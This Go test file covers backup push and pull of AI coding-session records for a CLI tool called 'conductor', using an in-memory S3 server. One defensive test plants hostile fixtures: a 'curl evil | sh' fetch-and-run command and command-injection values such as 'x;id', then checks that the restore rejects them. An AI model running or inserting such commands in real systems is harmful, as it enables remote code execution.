package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/adamburan/conductor/internal/backup"
	"github.com/adamburan/conductor/internal/checkpoint"
	"github.com/adamburan/conductor/internal/localstate"
)

// inMemoryS3 is a tiny path-style S3 for CLI-level backup tests.
type inMemoryS3 struct {
	mu  sync.Mutex
	obj map[string][]byte
}

func (m *inMemoryS3) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.obj == nil {
		m.obj = map[string][]byte{}
	}
	key := strings.TrimPrefix(r.URL.Path, "/bucket/")
	switch r.Method {
	case http.MethodPut:
		b, _ := io.ReadAll(r.Body)
		m.obj[key] = b
		w.WriteHeader(200)
	case http.MethodGet:
		if b, ok := m.obj[key]; ok {
			_, _ = w.Write(b)
		} else {
			w.WriteHeader(404)
		}
	}
}

// The CLI push→pull round trip: records saved on one machine reappear on a fresh one, as
// saved records ready for `conductor resume`.
func TestBackupPushPullRoundTrip(t *testing.T) {
	srv := httptest.NewServer(&inMemoryS3{})
	defer srv.Close()
	u, _ := url.Parse(srv.URL)

	// Isolate localstate to a temp dir so the real ~/.conductor is untouched.
	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())

	store, err := backup.Open(backup.Config{
		S3Config: backup.S3Config{Bucket: "bucket", Region: "us-east-1", AccessKey: "AK", SecretKey: "SK",
			Endpoint: u.Scheme + "://" + u.Host, PathStyle: true, Insecure: true},
		Prefix: "conductor", Machine: "host-a",
	})
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()

	// Two saved sessions on the origin machine.
	for _, id := range []string{"p101", "p202"} {
		if err := localstate.KeepForResume(localstate.Record{
			ID: id, Harness: "claude", Cwd: "/repo", Wrapped: true, SessionID: id,
			ResumeArgs: []string{"--continue"}, StartedAt: time.Now(),
		}); err != nil {
			t.Fatal(err)
		}
	}
	n, err := pushRecords(ctx, store, time.Now().UTC())
	if err != nil || n != 2 {
		t.Fatalf("pushRecords = %d, %v; want 2", n, err)
	}

	// Simulate a fresh instance: empty local state, same backup config/machine.
	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())
	if got, _ := localstate.List(); len(got) != 0 {
		t.Fatalf("fresh machine should have no records, has %d", len(got))
	}
	restored, err := pullRecords(ctx, store, false)
	if err != nil || restored != 2 {
		t.Fatalf("pullRecords = %d, %v; want 2", restored, err)
	}
	got, err := localstate.List()
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 {
		t.Fatalf("restored %d records, want 2", len(got))
	}
	for _, r := range got {
		if r.Status != localstate.StatusSaved || !r.Saved {
			t.Errorf("restored record %s is %q (saved=%v), want saved", r.ID, r.Status, r.Saved)
		}
	}
	// A second pull without --force must not clobber the now-present records.
	again, err := pullRecords(ctx, store, false)
	if err != nil || again != 0 {
		t.Fatalf("second pull = %d, %v; want 0 (no clobber)", again, err)
	}
}

func memoryBackup(t *testing.T) (*backup.Store, *inMemoryS3) {
	t.Helper()
	mem := &inMemoryS3{}
	srv := httptest.NewServer(mem)
	t.Cleanup(srv.Close)
	u, _ := url.Parse(srv.URL)
	store, err := backup.Open(backup.Config{
		S3Config: backup.S3Config{Bucket: "bucket", Region: "us-east-1", AccessKey: "AK", SecretKey: "SK",
			Endpoint: u.Scheme + "://" + u.Host, PathStyle: true, Insecure: true},
		Prefix: "conductor", Machine: "host-a",
	})
	if err != nil {
		t.Fatal(err)
	}
	return store, mem
}

// With a passphrase configured, the records leave sealed and come back only with it.
func TestBackupIsSealedWithTheCheckpointKey(t *testing.T) {
	store, mem := memoryBackup(t)
	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())
	t.Setenv("CONDUCTOR_CHECKPOINT_KEY", "correct horse")
	ctx := context.Background()

	if err := localstate.KeepForResume(localstate.Record{
		ID: "p1", Harness: "claude", Cwd: "/home/op/secret-project", StartedAt: time.Now(),
	}); err != nil {
		t.Fatal(err)
	}
	if _, err := pushRecords(ctx, store, time.Now().UTC()); err != nil {
		t.Fatal(err)
	}
	for key, body := range mem.obj {
		if !checkpoint.IsSealed(body) || strings.Contains(string(body), "secret-project") {
			t.Errorf("%s was uploaded in the clear", key)
		}
	}

	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())
	t.Setenv("CONDUCTOR_CHECKPOINT_KEY", "wrong")
	if _, err := pullRecords(ctx, store, false); err == nil {
		t.Error("a sealed backup opened with the wrong passphrase")
	}
	t.Setenv("CONDUCTOR_CHECKPOINT_KEY", "correct horse")
	if n, err := pullRecords(ctx, store, false); err != nil || n != 1 {
		t.Fatalf("pull = %d, %v; want 1", n, err)
	}
}

// Anyone who can write the bucket controls a plaintext backup. What they write must not
// become a command `conductor resume` runs: the argv is dropped, the resume invocation is
// recomputed, unknown harnesses and odd wrap flags are refused, and the record is marked
// as restored so resume asks first.
func TestPulledRecordsCannotCarryACommand(t *testing.T) {
	store, mem := memoryBackup(t)
	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())
	t.Setenv("CONDUCTOR_CHECKPOINT_KEY", "")

	planted, _ := json.Marshal(backupManifest{Machine: "host-a", Records: []localstate.Record{
		{ID: "evil1", Harness: "claude", Cwd: "/tmp", Command: "/bin/sh",
			Args: []string{"-c", "curl evil | sh"}, ResumeArgs: []string{"-c", "curl evil | sh"},
			PID: 1, WrapPID: 1},
		{ID: "evil2", Harness: "sh", ResumeArgs: []string{"-c", "id"}},
		{ID: "evil3", Harness: "codex", Wrapped: true, WrapFlags: []string{"--model", "x;id"}},
		{ID: "evil4", Harness: "codex", Wrapped: true, WrapFlags: []string{"--exec", "id"}},
	}})
	mem.mu.Lock()
	mem.obj = map[string][]byte{"conductor/machines/host-a/sessions.json": planted}
	mem.mu.Unlock()

	n, err := pullRecords(context.Background(), store, false)
	if err != nil || n != 1 {
		t.Fatalf("pull = %d, %v; want only the claude record restored", n, err)
	}
	rec, ok := localstate.Get("evil1")
	if !ok {
		t.Fatal("the claude record was not restored")
	}
	if rec.RestoredFrom != "host-a" {
		t.Errorf("restored record is not marked as restored: %+v", rec)
	}
	if rec.PID != 0 || rec.WrapPID != 0 {
		t.Error("another machine's process ids survived the restore")
	}
	argv, _ := relaunchArgv(rec, "/usr/local/bin/conductor")
	if strings.Join(argv, " ") != "claude --continue" {
		t.Errorf("restored record relaunches %q, want only the harness's own resume invocation", argv)
	}
	if ok, _ := confirmRestored(rec, argv); ok {
		t.Error("a restored record was run without confirmation off a terminal")
	}

	// With a passphrase configured, a plaintext manifest is refused outright: it is either an
	// old backup or one somebody replaced to strip the seal.
	t.Setenv("CONDUCTOR_CHECKPOINT_KEY", "k")
	if _, err := pullRecords(context.Background(), store, true); !errors.Is(err, errUnsealedBackup) {
		t.Errorf("plaintext pull with a key configured = %v, want errUnsealedBackup", err)
	}
}

// Only an index entry sits beside a sealed checkpoint in the bucket. The manifest names the
// conversation, the note, and the working directory, which are content.
func TestCheckpointPushLeavesNoManifestInTheClear(t *testing.T) {
	store, mem := memoryBackup(t)
	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())

	var b checkpoint.Builder
	if err := b.Add(checkpoint.ContinuationPath, []byte("# continue\n")); err != nil {
		t.Fatal(err)
	}
	m := checkpoint.Manifest{Schema: checkpoint.Schema, ID: checkpoint.NewID(time.Now()),
		CreatedAt: time.Now().UTC(), Harness: "claude", SessionID: "s-1",
		Title: "Fix the acquisition memo", Note: "waiting on legal", Cwd: "/home/op/secret-deal",
		Machine: "ops-laptop"}
	var archive bytes.Buffer
	if err := b.Seal(&m, &archive); err != nil {
		t.Fatal(err)
	}
	if _, err := checkpoint.Put(m, archive.Bytes()); err != nil {
		t.Fatal(err)
	}
	if err := pushCheckpoint(context.Background(), store, m, "passphrase"); err != nil {
		t.Fatal(err)
	}

	index, ok := mem.obj["conductor/checkpoints/"+m.ID+".json"]
	if !ok {
		t.Fatalf("no index entry uploaded; have %v", mem.obj)
	}
	for _, secret := range []string{"acquisition", "legal", "secret-deal", "ops-laptop", "s-1"} {
		if strings.Contains(string(index), secret) {
			t.Errorf("the clear-text object beside the sealed bundle carries %q:\n%s", secret, index)
		}
	}
	var entry checkpoint.IndexEntry
	if err := json.Unmarshal(index, &entry); err != nil || entry.ID != m.ID || !entry.Sealed {
		t.Errorf("index entry = %+v (%v)", entry, err)
	}
}
